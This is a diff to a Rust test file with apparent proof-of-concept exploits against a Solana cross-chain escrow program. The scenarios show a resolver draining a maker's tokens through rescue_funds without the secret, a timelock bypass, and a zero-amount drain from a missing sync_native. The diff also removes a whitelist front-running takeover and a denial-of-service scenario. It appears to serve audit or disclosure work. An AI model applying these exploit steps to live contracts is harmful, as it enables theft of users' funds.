@@ -3,19 +3,19 @@ use common::constants::RESCUE_DELAY;
 use common_tests::dst_program::DstProgram;
 use common_tests::helpers::*;
 use common_tests::src_program::{create_order, SrcProgram};
-use common_tests::whitelist::{deregister, init_whitelist, prepare_resolvers_src, register};
+use common_tests::whitelist::prepare_resolvers_src;
 use solana_program_test::tokio;
-use solana_sdk::{native_token::LAMPORTS_PER_SOL, signature::Signer, signer::keypair::Keypair};
+use solana_sdk::{native_token::LAMPORTS_PER_SOL, signature::Signer};
 use test_context::{test_context, AsyncTestContext};
 
 // ============================================================================
-// SCENARIO 1: Realistic End-to-End Cross-Chain Exit Scam (Theft of Principal)
+// SCENARIO 1: Cross-Chain Exit Scam by Whitelisted Resolver (Theft of Principal)
 // ============================================================================
 #[test_context(TestStateBase<SrcProgram, TokenSPL>)]
 #[tokio::test]
-async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBase<SrcProgram, TokenSPL>) {
+async fn test_attack_cross_chain_exit_scam_by_resolver(src_state: &mut TestStateBase<SrcProgram, TokenSPL>) {
     println!("\n=========================================");
-    println!("=== SCENARIO 1: Realistic Cross-Chain Exit Scam ===");
+    println!("=== SCENARIO 1: Cross-Chain Exit Scam by Resolver ===");
     println!("=========================================");
 
     let mut dst_state = TestStateBase::<DstProgram, TokenSPL>::setup().await;
@@ -24,7 +24,7 @@ async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBa
     src_state.secret = dst_state.secret;
     src_state.hashlock = dst_state.hashlock;
 
-    // --- PHASE 1: NORMAL FLOW (Maker creates order BEFORE attack) ---
+    // --- PHASE 1: NORMAL FLOW (Maker creates order) ---
     println!("\n=== DAY 0: Normal Flow - Maker locks funds ===");
     
     src_state.test_arguments.asset_is_native = false;
@@ -44,24 +44,15 @@ async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBa
 
     println!("[CHAIN A] Maker locked 100 JUP in Order.");
     println!("[BEFORE] Maker JUP balance: {}", maker_initial_jup);
-    println!("[BEFORE] Attacker (Taker) JUP balance: {}", attacker_initial_jup);
-    println!("[BEFORE] Attacker (Maker DST) SOL balance: {}", attacker_initial_sol);
+    println!("[BEFORE] Attacker (Resolver) JUP balance: {}", attacker_initial_jup);
+    println!("[BEFORE] Attacker (Resolver) SOL balance: {}", attacker_initial_sol);
 
-    // --- PHASE 2: THE INTERCEPTION (Attacker Front-runs Whitelist Initialize) ---
-    println!("\n=== PHASE 2: Interception - Attacker front-runs Whitelist initialization ===");
+    // --- PHASE 2: ATTACKER (RESOLVER) FILLS ORDER ---
+    println!("\n=== PHASE 2: Whitelisted Resolver fills Maker's order ===");
     
-    // The taker_wallet in src_state will act as our Attacker.
-    src_state.authority_whitelist_kp = src_state.taker_wallet.keypair.insecure_clone();
-    
-    let _whitelist_state = init_whitelist(src_state).await; // Attacker wins the race!
-    println!("[ATTACK] Attacker successfully hijacked Whitelist Authority.");
-
-    // --- PHASE 3: ATTACKER BECOMES RESOLVER & FILLS ORDER ---
-    println!("\n=== PHASE 3: Attacker registers as Resolver and fills Maker's order ===");
-    
-    // Attacker registers their wallet (taker_wallet) as a Resolver for SRC program
-    register(src_state, cross_chain_escrow_src::ID, src_state.taker_wallet.keypair.pubkey()).await;
-    println!("[ATTACK] Attacker registered as Resolver for SRC chain.");
+    // Attacker is a legitimate whitelisted resolver
+    prepare_resolvers_src(src_state, &[src_state.taker_wallet.keypair.pubkey()]).await;
+    println!("[SETUP] Attacker is a registered Whitelisted Resolver.");
 
     // Attacker (acting as Taker) fills the order on SRC. 100 JUP moves to escrow_ata.
     let (escrow_a, escrow_ata_a) = create_escrow(src_state).await;
@@ -78,14 +69,14 @@ async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBa
     println!("[CHAIN B] Attacker locked 5 SOL in EscrowDst.");
     println!("[CHAIN B] BUG: escrow_ata.amount = 0 due to missing sync_native!");
 
-    // --- PHASE 4: THE EXPLOIT (Timelock Bypass & Fund Theft) ---
+    // --- PHASE 3: THE EXPLOIT (Timelock Bypass & Fund Theft) ---
     println!("\n=== DAY 8: Attacker exploits rescue_funds ===");
     
     // Fast forward time by 8 days + 100 seconds
     set_time(&mut src_state.context, src_state.init_timestamp + RESCUE_DELAY + 100);
     set_time(&mut dst_state.context, dst_state.init_timestamp + RESCUE_DELAY + 100);
 
-    // 4a: Attacker recovers SOL on DST via rescue_funds(0) due to missing sync_native
+    // 3a: Attacker recovers SOL on DST via rescue_funds(0) due to missing sync_native
     println!("\n--- STEP 1: Attacker recovers SOL on Chain B ---");
     
     let attacker_sol_before_rescue = dst_state.client.get_balance(dst_state.maker_wallet.keypair.pubkey()).await.unwrap();
@@ -118,7 +109,7 @@ async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBa
     }
     assert!(escrow_b_ata_after.is_none(), "Escrow B ATA should be closed after exploit");
 
-    // 4b: Attacker steals Maker's JUP on SRC via rescue_funds_for_escrow (NO SECRET NEEDED)
+    // 3b: Attacker steals Maker's JUP on SRC via rescue_funds_for_escrow (NO SECRET NEEDED)
     println!("\n--- STEP 2: Attacker steals JUP on Chain A WITHOUT SECRET ---");
     
     let attacker_jup_before_rescue = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
@@ -140,7 +131,7 @@ async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBa
     
     println!("[CHAIN A] Attacker stole {} JUP via rescue_funds_for_escrow WITHOUT REVEALING THE SECRET!", stolen_jup);
 
-    // --- PHASE 5: IMPACT ANALYSIS ---
+    // --- PHASE 4: IMPACT ANALYSIS ---
     println!("\n=========================================");
     println!("=== CROSS-CHAIN PROFIT & LOSS ANALYSIS ===");
     println!("=========================================");
@@ -186,85 +177,7 @@ async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBa
 }
 
 // ============================================================================
-// SCENARIO 2: Permanent DoS via Resolver Deregistration
-// ============================================================================
-#[test_context(TestStateBase<SrcProgram, TokenSPL>)]
-#[tokio::test]
-async fn test_attack_permanent_dos_via_deregister(src_state: &mut TestStateBase<SrcProgram, TokenSPL>) {
-    println!("\n=========================================");
-    println!("=== SCENARIO 2: Permanent DoS via Deregister ===");
-    println!("=========================================");
-
-    // --- PHASE 1: WHITELIST TAKEOVER ---
-    println!("\n[PHASE 1] Attacker takes over Whitelist Protocol");
-    let attacker_kp = Keypair::new();
-    transfer_lamports(&mut src_state.context, WALLET_DEFAULT_LAMPORTS, &src_state.payer_kp, &attacker_kp.pubkey()).await;
-    
-    // Attacker front-runs the initialization
-    src_state.authority_whitelist_kp = attacker_kp.insecure_clone();
-    let _whitelist_state = init_whitelist(src_state).await;
-    println!("[ATTACK] Attacker successfully front-ran initialization and is now Authority.");
-
-    // --- PHASE 2: SETUP LEGIT RESOLVER ---
-    println!("\n[PHASE 2] Setup Legit Resolver");
-    let legit_resolver_kp = Keypair::new();
-    transfer_lamports(&mut src_state.context, WALLET_DEFAULT_LAMPORTS, &src_state.payer_kp, &legit_resolver_kp.pubkey()).await;
-    
-    // Attacker (as authority) registers a legit resolver just to setup the environment
-    register(src_state, cross_chain_escrow_src::ID, legit_resolver_kp.pubkey()).await;
-    println!("[SETUP] Legit Resolver registered under Attacker's authority.");
-
-    // --- PHASE 3: NORMAL FLOW BEFORE ATTACK ---
-    println!("\n[PHASE 3] Normal Flow: Maker creates order, Legit Resolver fills it");
-    src_state.test_arguments.asset_is_native = false;
-    src_state.test_arguments.order_amount = 100_000_000;
-    src_state.test_arguments.escrow_amount = 100_000_000;
-    let (_order_1, _order_ata_1) = create_order(src_state).await;
-    
-    // Use legit resolver to fill the order
-    src_state.taker_wallet.keypair = legit_resolver_kp.insecure_clone();
-    let (escrow_1, _escrow_ata_1) = create_escrow(src_state).await;
-    
-    assert!(src_state.client.get_account(escrow_1).await.unwrap().is_some(), "Legit resolver should be able to fill");
-    println!("[VERIFY] Legit Resolver successfully filled order before attack.");
-
-    // --- PHASE 4: THE EXPLOIT (Deregister) ---
-    println!("\n[PHASE 4] Attacker deregisters Legit Resolver");
-    
-    // Attacker uses their authority to deregister the legit resolver
-    deregister(src_state, cross_chain_escrow_src::ID, legit_resolver_kp.pubkey()).await;
-    println!("[ATTACK] Legit Resolver has been deregistered!");
-
-    // --- PHASE 5: IMPACT ANALYSIS (DoS) ---
-    println!("\n[PHASE 5] Legit Resolver attempts to fill another order");
-    
-    // Change salt to create a completely new order and avoid PDA collisions
-    src_state.test_arguments.salt = DEFAULT_SALT + 1;
-    let (_order_2, _order_ata_2) = create_order(src_state).await;
-    
-    // Legit resolver tries to fill it
-    let (_, _, fill_tx) = create_escrow_data(src_state);
-    let result = src_state.client.process_transaction(fill_tx).await;
-
-    let is_dos = result.is_err();
-    if is_dos {
-        println!("[IMPACT] Legit Resolver transaction FAILED (DoS Successful).");
-        println!("[IMPACT] Error: AccountNotInitialized (resolver_access PDA was closed by attacker).");
-    } else {
-        panic!("DoS failed, legit resolver should not be able to fill!");
-    }
-
-    println!("\n=========================================");
-    println!("=== FINAL IMPACT ANALYSIS ===");
-    println!("=========================================");
-    println!("[VERDICT] Permanent DoS achieved. No legit resolvers can fill orders.");
-    println!("[VERDICT] The 1inch cross-chain protocol on Solana is completely paralyzed.");
-    
-    assert!(is_dos, "Legit resolver should be blocked from filling orders");
-}
-
-// ============================================================================
-// SCENARIO 3: Timelock Bypass Proof (Standalone)
+// SCENARIO 2: Timelock Bypass Proof (Standalone)
 // ============================================================================
 #[test_context(TestStateBase<DstProgram, TokenSPL>)]
 #[tokio::test]
@@ -272,7 +185,7 @@ async fn test_rescue_bypasses_cancellation_timelock(
     test_state: &mut TestStateBase<DstProgram, TokenSPL>
 ) {
     println!("\n=========================================");
-    println!("=== SCENARIO 3: Timelock Bypass Proof ===");
+    println!("=== SCENARIO 2: Timelock Bypass Proof ===");
     println!("=========================================");
 
     test_state.token = NATIVE_MINT;
@@ -363,7 +276,7 @@ async fn test_rescue_bypasses_cancellation_timelock(
 }
 
 // ============================================================================
-// SCENARIO 4: Single-Chain Zero-Amount Drain (Standalone)
+// SCENARIO 3: Single-Chain Zero-Amount Drain (Standalone)
 // ============================================================================
 #[test_context(TestStateBase<DstProgram, TokenSPL>)]
 #[tokio::test]
@@ -371,7 +284,7 @@ async fn test_native_dst_zero_amount_drain(
     test_state: &mut TestStateBase<DstProgram, TokenSPL>
 ) {
     println!("\n=========================================");
-    println!("=== SCENARIO 4: Single-Chain Zero-Amount Drain ===");
+    println!("=== SCENARIO 3: Single-Chain Zero-Amount Drain ===");
     println!("=========================================");
 
     test_state.token = NATIVE_MINT;
